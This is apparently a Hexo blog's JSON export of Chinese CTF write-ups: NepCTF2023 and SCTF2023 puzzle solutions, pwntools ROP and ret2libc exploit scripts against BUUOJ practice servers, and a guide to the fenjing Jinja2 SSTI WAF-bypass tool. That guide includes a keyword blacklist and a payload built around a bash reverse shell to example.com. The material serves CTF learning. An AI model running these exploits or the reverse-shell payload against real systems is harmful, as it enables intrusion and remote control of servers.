{"meta":{"title":"yixinBC's blog","subtitle":"always learning","description":"yixinBC的个人博客","author":"yixinBC","url":"https://yixinbc.tech","root":"/"},"pages":[],"posts":[{"title":"NepCTF2023","slug":"NepCTF2023","date":"2023-08-13T19:21:01.000Z","updated":"2023-08-13T11:24:35.996Z","comments":true,"path":"2023/08/13/NepCTF2023/","link":"","permalink":"https://yixinbc.tech/2023/08/13/NepCTF2023/","excerpt":"","text":"MISC与AI共舞的哈夫曼三血拿下！扔进vscode，然后手动def decompress函数，等待copilot的AI补全，然后根据报错改改，生成的代码如下： 123456789101112131415161718192021222324252627282930313233343536373839def decompress(compressed_file, decompressed_file): with open(compressed_file, &quot;rb&quot;) as f: data = f.read() # Read frequency information frequencies = &#123;&#125; num_of_chars = data[0] i = 1 for j in range(num_of_chars): char = data[i] freq = ( (data[i + 1] &lt;&lt; 24) | (data[i + 2] &lt;&lt; 16) | (data[i + 3] &lt;&lt; 8) | data[i + 4] ) frequencies[char] = freq i += 5 root = build_huffman_tree(frequencies) # Read compressed data current_node = root decompressed_data = &quot;&quot; for byte in data[i:]: byte = bin(byte)[2:].rjust(8, &quot;0&quot;) for bit in byte: if bit == &quot;0&quot;: current_node = current_node.left else: current_node = current_node.right if current_node.char is not None: decompressed_data += chr(current_node.char) current_node = root &quot;&quot;&quot; # Remove padding padding = int(decompressed_data[-8:], 2) decompressed_data = decompressed_data[:-padding] &quot;&quot;&quot; with open(decompressed_file, &quot;w&quot;) as f: f.write(decompressed_data) 得到flag为：Nepctf&#123;huffman_zip_666&#125; 小叮弹钢琴打开midi文件，前半部分的长短很容易想到摩斯密码，解码拿到：YOUSHOULDUSETHISTOXORSOMETHING，后面一串很明显0x开头的十六进制，顺时针旋转90°可以读出来0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17 写个脚本xor一下（摩斯结果的大小写卡了我好久） 12345678import binascii# key = b&quot;YOUSHOULDUSETHISTOXORSOMETHING&quot;key = b&quot;youshouldusethistoxorsomething&quot;x = 0x370A05303C290E045005031C2B1858473A5F052117032C39230F005D1E17xor = bytes([a ^ b for a, b in zip(key, binascii.unhexlify(hex(x)[2:]))])print(xor)# b&#x27;NepCTF&#123;h4ppy_p14N0&#125;NepCTF&#123;h4pp&#x27; ConnectedFive手动玩一下到42分就好了： 你也喜欢三月七么做人就得脑洞大开。看题目描述，咸的是salt（即官方群名NepCTF2023）,题目有iv和256，想到aes256，十六字节的key试了好久，解密不成功。后面看题目啥256和salt好像指向sha256编码，但是结果应该是256字节的一串，猜测可能要截断，确实，解密出了有意义的信息。（后面管理说题目里的“关键”就是指key，有被冷到，嘶~） 1234567891011121314151617from hashlib import sha256from Crypto.Cipher import AESimport binasciikey_length = 16iv_hex = &quot;88219bdee9c396eca3c637c0ea436058&quot;ciphertext_hex = &quot;b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc&quot;# Convert hex strings to bytesiv = binascii.unhexlify(iv_hex)ciphertext = binascii.unhexlify(ciphertext_hex)salt = b&quot;NepCTF2023&quot;key = sha256(salt).digest()[:key_length]cipher = AES.new(key, AES.MODE_CBC, iv)plaintext = cipher.decrypt(ciphertext)print(plaintext)#b&#x27;6148523063484d364c793970625763784c6d6c745a3352774c6d4e76625338794d44497a4c7a41334c7a49304c336c5061316858553070554c6e42755a773d3d&#x27; 赛博厨子hex+base64，得到一个网址：https://img1.imgtp.com/2023/07/24/yOkXWSJT.png 下载图片，发现又是不知名的文字。 各种识图工具往上扔，都识别不出来。后来联想到题目背景星穹铁道、个人玩原神和星穹铁道的经验、以及LitCTF的珠玉在前，猜测是米哈游的游戏内文字。百度“星穹铁道字母对照表”，找到文字对照表 - 星穹铁道列车智库 - 灰机wiki然后凭借眼力搜索与一点必要的猜测，得到flag为NepCTF&#123;HRP_aIways_likes_March_7th&#125; 陌生的语言hint1:A同学的英文名为“Atsuko Kagari”。搜索可知来自《小魔女学园》，然后搜各种文章，发现没有这两种文字的相关信息。某次搜索时百度智能联想到设定，同时结合前期搜索到的动画官方站wikihttp://littlewitchacademia.jp/tv1st/witchpedia/02.html，确定两种文字为：古代ドラゴン語、ルーナ文字，谷歌搜索前几个结果未见码表，直到一推特链接https://twitter.com/i/events/946875269771440128，跟踪，发现龙语码表：https://www.google.co.jp/search?q=alphabets+of+dinotopia&amp;num=20&amp;newwindow=1&amp;dcr=0&amp;source=lnms&amp;tbm=isch&amp;sa=X&amp;ved=0ahUKEwi-1ZHZqLDYAhVOQLwKHU6dDKQQ_AUICigB&amp;biw=1345&amp;bih=963#imgrc=okTWVTFWkL_U-M，得到flag的第一部分：NEPNEPABELIEVING ，在推特内搜索另一语言，终于找到码表：https://twitter.com/araymkm_0F/status/828267705853546496，得到flag的第二部分：HEARTISYOURMAGIC 根据平台所给flag格式怎么交都不对，直到更新hint：flag格式请选手根据自身语感自行添加下划线，故最后flag为：NepCTF&#123;NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC&#125; codes我真傻，真的，我单知道C语言读取环境变量有很多种方法，肯定会禁用好多，却没想到编译前还会检查代码里是否含有env，改个变量名就能嘎嘎绕。以下是利用main函数的第三个参数实现打印系统变量的代码： 1234567891011#include&lt;stdio.h&gt;int main(int argc,char** argv,char** e)&#123;char** en;for(en = e; *en !=0; en++)&#123;char* this = *en;printf(&quot;%s\\n&quot;, this);&#125;&#125;//Nepctf&#123;easy_codes_427e8401-0944-47ad-8c45-6e9fc992ba8f_[TEAM_HASH]&#125;","categories":[],"tags":[]},{"title":"暑期第一周刷题","slug":"暑期第一周刷题","date":"2023-07-13T20:14:37.000Z","updated":"2023-08-13T11:24:36.004Z","comments":true,"path":"2023/07/13/暑期第一周刷题/","link":"","permalink":"https://yixinbc.tech/2023/07/13/%E6%9A%91%E6%9C%9F%E7%AC%AC%E4%B8%80%E5%91%A8%E5%88%B7%E9%A2%98/","excerpt":"","text":"get_started_3dsctf_2016一开始以为是ret2text板子题（那么大个get_flag函数）。照板子写，打远程，没回显，报错。检查发现函数的返回方式不是leave retn而是retn，遂将fake_ebp的padding去除。没打通。翻网上的题解，发现有师傅提到这题的远程只有程序能正常退出的时候才有回显（确实是老题了，这几年的新题不会这么离谱😅）。遂将get_flag函数的返回地址设置为elf.sym[&quot;exit&quot;]。get_flag函数开头有一个if判断： 原始思路是直接ret2text的时候越过if判断，注意到汇编中此函数在retn前有pop esi，函数开头有push esi，想法是把栈构造成下面这样: stack_overflow_padding 0x38 ret2txet_addr(after elf.sym[“get_flag”]) fake_pop_esi elf.sym[“exit”] 不知为何打不通。老老实实过if判断： stack_overflow_padding 0x38 elf.sym[“get_flag”] elf.sym[“exit”] get_flag arg1 0x308CD64F get_flag arg2 0x195719D1 最后exp如下： 12345678910111213141516from pwn import *context.log_level = &quot;debug&quot;context.arch = &quot;i386&quot;elf = ELF(&quot;./get_started_3dsctf_2016&quot;)# p = process(&quot;./get_started_3dsctf_2016&quot;)p = remote(&quot;node4.buuoj.cn&quot;, 27999)sleep(1)p.send( b&quot;a&quot; * 0x38 + p32(elf.sym[&quot;get_flag&quot;]) + p32(elf.sym[&quot;exit&quot;]) + p32(0x308CD64F) + p32(0x195719D1))p.interactive() [OGeek2019]babyrop32位ret2libc，write泄露，这题因为send和sendline的原因卡了好久，下次写脚本准备先无脑上sendline了 脚本如下： 1234567891011121314151617181920212223242526from pwn import *context.log_level = &quot;debug&quot;context.arch = &quot;i386&quot;# p = process(&quot;./pwn&quot;)p = remote(&quot;node4.buuoj.cn&quot;, 26926)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc-2.23.so&quot;)p.sendline(b&quot;\\x00&quot; + b&quot;\\xff&quot; * 7)p.recvuntil(b&quot;Correct\\n&quot;)p.sendline( b&quot;a&quot; * (0xE7 + 4) + p32(elf.plt[&quot;write&quot;]) + p32(0x08048825) # main + p32(1) + p32(elf.got[&quot;write&quot;]) + p32(4))write_addr = u32(p.recv(4))libc_base = write_addr - libc.sym[&quot;write&quot;]system_addr = libc_base + libc.sym[&quot;system&quot;]binsh_addr = libc_base + libc.search(b&quot;/bin/sh&quot;).__next__()p.sendline(b&quot;\\x00&quot; + b&quot;\\xff&quot; * 7)p.recvuntil(b&quot;Correct\\n&quot;)p.sendline(b&quot;a&quot; * (0xE7 + 4) + p32(system_addr) + p32(0xDEADBEEF) + p32(binsh_addr))p.interactive() [HarekazeCTF2019]baby_rop64位rop板子题。注意程序里有/bin/sh字符串，可以在ida的strings页面找到。远程flag的位置很怪啊，学习了一下find命令。不知道为什么远程交互的时候过没几秒没操作就会eof exp如下： 123456789101112131415161718from pwn import *context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;# p = process(&quot;./babyrop&quot;)p = remote(&quot;node4.buuoj.cn&quot;, 26515)elf = ELF(&quot;./babyrop&quot;)pop_rdi = 0x400683p.sendlineafter( b&quot;What&#x27;s your name? &quot;, b&quot;A&quot; * 0x10 + b&quot;B&quot; * 8 + p64(pop_rdi) + p64(elf.sym[&quot;binsh&quot;]) + p64(elf.plt[&quot;system&quot;]),)p.interactive()","categories":[],"tags":[]},{"title":"SCTF2023 MISC 部分Writeup","slug":"SCTF2023","date":"2023-06-20T15:58:15.000Z","updated":"2023-08-13T11:24:36.000Z","comments":true,"path":"2023/06/20/SCTF2023/","link":"","permalink":"https://yixinbc.tech/2023/06/20/SCTF2023/","excerpt":"","text":"checkin010修改一下压缩包，把第一个经过压缩算法的flag&#x2F;改为flag（record和dirEntry里的都要改）。改完直接用Windows资源管理器开会报错（大概是修得不完美），但是能用7zip解压出来flag文件。打开发现是个压缩包，flag直接明文存在1.txt，所以用010打开能直接看见flag Fly over the Fuchun River查看图片，可以看到飞机编号B-32DC，通过flightaware查询可知是成都航空的航班，查询其四月的历史飞行记录：https://zh.flightaware.com/live/flight/B32DC/history/320 ，根据题目fuchun river，可知此时在杭州，又题目中的拍摄时间为12:15，可查找到一定期的航班CTU-&gt;HGH，且该班次有些晚点，符合的天数只剩4.3、4.7、4.13、4.17。在携程上可以查到该班次航班号为EU2259。枚举一下日期，即可得到flag为SCTF&#123;CTU_HGH_EU2259_413&#125;","categories":[],"tags":[],"author":"yixinBC"},{"title":"fenjing(焚靖)——jinja2 SSTI一把梭","slug":"fenjing","date":"2023-05-11T18:36:24.000Z","updated":"2023-08-13T11:24:36.004Z","comments":true,"path":"2023/05/11/fenjing/","link":"","permalink":"https://yixinbc.tech/2023/05/11/fenjing/","excerpt":"","text":"焚靖是一个针对Jinja2 SSTI的命令行脚本，具有强大的自动绕过WAF功能 安装使用pip（最省事）12pip install fenjingpython -m fenjing scan --url &#x27;http://xxx/&#x27; 也可下载并运行docker镜像12docker pull marven11/fenjingdocker run --net host -it marven11/fenjing scan --url &#x27;http://xxx/&#x27; 还可以直接下载源码12git clone https://github.com/Marven11/Fenjingcd Fenjing 下载后可以选择直接使用（先确保用pip安装完依赖） 1python -m pip install -r requirements.txt 也可以手动构建一个docker镜像 12docker build -t fenjing .docker run -it --net host fenjing scan --url &#x27;http://xxx/&#x27; 使用12345678910111213141516171819202122232425262728293031323334$ python -m fenjing --helpUsage: python -m fenjing [OPTIONS] COMMAND [ARGS]...Options: --help Show this message and exit.Commands: crack 攻击指定的表单 scan 扫描指定的网站$ python -m fenjing crack --helpUsage: python -m fenjing crack [OPTIONS] 攻击指定的表单Options: -u, --url TEXT form所在的URL -a, --action TEXT form的action，默认为当前路径 -m, --method TEXT form的提交方式，默认为POST -i, --inputs TEXT form的参数，以逗号分隔 -e, --exec-cmd TEXT 成功后执行的shell指令，不填则成功后进入交互模式 --interval FLOAT 每次请求的间隔 --user-agent TEXT 请求时使用的User Agent --help Show this message and exit.$ python -m fenjing scan --helpUsage: python -m fenjing scan [OPTIONS] 扫描指定的网站Options: -u, --url TEXT 需要扫描的URL -e, --exec-cmd TEXT 成功后执行的shell指令，不填则进入交互模式 --interval FLOAT 每次请求的间隔 --user-agent TEXT 请求时使用的User Agent --help Show this message and exit. 也可做为一个python模块集成进脚本中使用 12345678910111213141516171819202122from fenjing import exec_cmd_payloadimport logginglogging.basicConfig(level = logging.INFO)def waf(s: str): blacklist = [ &quot;config&quot;, &quot;self&quot;, &quot;g&quot;, &quot;os&quot;, &quot;class&quot;, &quot;length&quot;, &quot;mro&quot;, &quot;base&quot;, &quot;request&quot;, &quot;lipsum&quot;, &quot;[&quot;, &#x27;&quot;&#x27;, &quot;&#x27;&quot;, &quot;_&quot;, &quot;.&quot;, &quot;+&quot;, &quot;~&quot;, &quot;&#123;&#123;&quot;, &quot;0&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;, &quot;０&quot;,&quot;１&quot;,&quot;２&quot;,&quot;３&quot;,&quot;４&quot;,&quot;５&quot;,&quot;６&quot;,&quot;７&quot;,&quot;８&quot;,&quot;９&quot; ] for word in blacklist: if word in s: return False return Truepayload, _ = exec_cmd_payload(waf, &quot;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/example.com/3456 0&gt;&amp;1\\&quot;&quot;)print(payload) 支持的绕过 &#39;和&quot;的绕过 绝大部分关键字的绕过 自然数的绕过 下划线_ +和- ~ [下标访问的绕过 &#123;&#123;&#125;&#125;标签的绕过 使用示例[GDOUCTF 2023]&lt;ez_ze&gt;打开题目发现是一个使用POST提交表单的网页，检查响应头的Sever字段，发现是Werkzeug/2.2.3 Python/3.8.16，所以应该是一个flask程序，考虑SSTI。使用一些常见的jinja2 SSTI payload，发现都会被WAF给过滤。尝试焚靖一把梭： 123456789101112131415161718$ python -m fenjing crack -u http://node1.anna.nssctf.cn:28140/get_flag -i name ____ _ _ / __/__ ____ (_|_)___ ____ _ / /_/ _ \\/ __ \\ / / / __ \\/ __ `/ / __/ __/ / / / / / / / / / /_/ //_/ \\___/_/ /_/_/ /_/_/ /_/\\__, / /___/ /____/...INFO:[cli] | Use Ctrl+D to exit.$&gt;&gt; cat /flag...Hello, $ NSSCTF&#123;82377006-eb0f-4ebd-9a9f-ba6ad3ba7c17&#125; $!$&gt;&gt; 可见焚靖的WAF绕过能力还是非常强大的 参考资料Marven11&#x2F;Fenjing: 一个类似SQLMap的Jinja2 SSTI利用脚本 | A SQLMap-like Jinja2 SSTI cracker（官方GitHub页面） 想找一个通用的SSTI payload生成器？可以去尝试一下tplmap","categories":[],"tags":[],"author":"yixinBC"},{"title":"Hexo + volantis配置","slug":"hello-world","date":"2023-04-21T15:00:00.000Z","updated":"2023-08-13T11:24:36.004Z","comments":true,"path":"2023/04/21/hello-world/","link":"","permalink":"https://yixinbc.tech/2023/04/21/hello-world/","excerpt":"","text":"移步GitHub 仓库查看配置文件源码。","categories":[],"tags":[],"author":"yixinBC"}],"categories":[],"tags":[]}